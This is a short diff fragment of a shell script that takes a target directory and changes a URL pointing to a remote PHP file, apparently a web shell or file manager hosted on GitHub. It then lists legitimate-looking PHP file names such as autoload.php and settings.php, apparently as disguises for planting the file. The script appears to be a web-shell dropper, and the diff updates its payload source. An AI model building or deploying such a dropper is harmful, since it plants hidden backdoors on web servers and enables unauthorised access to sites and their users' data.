@@ -6,7 +6,7 @@ if [ -z "$1" ]; then
 fi
 
 TARGET_DIR="$1"
-PHP_URL="https://raw.githubusercontent.com/paylar/NewShell/refs/heads/main/gyokka.php"
+PHP_URL="https://raw.githubusercontent.com/RaitoKazuki/sh/refs/heads/main/fm.php"
 
 PHP_FILES=(
   "autoload.php" "constants.php" "settings.php" "middleware.php" "dispatcher.php" 
